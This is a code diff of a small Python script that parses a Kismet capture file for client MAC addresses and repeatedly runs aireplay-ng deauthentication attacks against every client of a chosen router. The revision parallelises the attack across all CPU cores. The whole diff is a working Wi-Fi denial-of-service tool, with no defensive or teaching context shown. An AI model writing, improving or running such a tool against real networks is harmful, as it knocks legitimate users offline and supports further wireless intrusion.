@@ -1,36 +1,29 @@
-#!/usr/bin/env python3
+#!/usr/bin/env python3.5
 import re
 from subprocess import call
 from sys import argv
-from sys import exit
+from joblib import Parallel, delayed
+import multiprocessing
+
 
 if len(argv) != 3:
-    print(argv[1] + " \"BSSID_router\" \"XXXX-XX.kismet.netxml\"")
-    exit(0)
+	print("ejecutable \"MAC_router\" \"XXXX-XX.kismet.netxml\"")
+	raise SystemExit
 
+n_cpu = multiprocessing.cpu_count()
+basura, bssid, archivo = argv
 
-nothing, macRouter, archivo = argv
-archivo += ".kismet.netxml"
+if not ".kismet.netxml" in archivo:
+	archivo += ".kismet.netxml"
+
+def aireplay(x):
+	if x != bssid:
+		call(["aireplay-ng", "-0", "1", "-a", bssid, "-c", x, "wlan0mon"])
+		
 
 while True:
-    fd = open(archivo, 'r')
-    resultado = re.findall("(\w)(\w):(\w)(\w):(\w)(\w):(\w)(\w):(\w)(\w):(\w)(\w)", fd.read())
-    fd.close()
-    mac = list()
-    for i in range(0, len(resultado)):
-        string = ""
-        contador = 0
-        j = 0
-        while j != 12:
-            if contador != 2:
-                string += resultado[i][j]
-                contador += 1
-                j += 1
-            else:
-                string += ":"
-                contador = 0
-        mac.append(string)
-
-    for x in range(0, len(mac)):
-        if mac[x] != macRouter:
-            call(["aireplay-ng", "-0", "4", "-a", macRouter, "-c", mac[x], "wlan0mon"]) # Edit wlan0mon if the monitor is named different
+	mac = list()
+	fd = open(archivo, 'r')
+	mac = re.findall("(\w\w:\w\w:\w\w:\w\w:\w\w:\w\w)", fd.read())
+	fd.close()
+	Parallel(n_jobs=n_cpu)(delayed(aireplay)(i) for i in mac)
